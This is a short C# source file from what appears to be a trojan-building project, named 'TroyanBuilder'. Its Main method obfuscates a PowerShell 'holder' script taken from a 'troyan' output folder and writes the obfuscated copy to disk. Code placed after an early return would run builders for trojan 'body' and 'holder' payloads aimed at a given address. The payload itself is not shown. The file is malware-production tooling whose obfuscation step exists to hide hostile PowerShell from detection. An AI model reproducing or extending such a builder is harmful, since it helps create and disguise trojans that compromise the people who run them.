namespace TroyanBuilder;

class Program
{
    static void Main(string[] args)
    {
        var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\_output\holder.debug.ps1");
        data = new PowerShellObfuscator().Obfuscate(data);
        System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\holder.ob.ps1", data);
        return;
        
        var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
        foreach (var cb in arr)
        {
            Console.WriteLine(cb);
            var result = cb.Build(args.Length > 0 ? args[0] : "127.0.0.1");
            foreach (var line in result)
            {
                Console.WriteLine(line);    
            }
        }
    }
}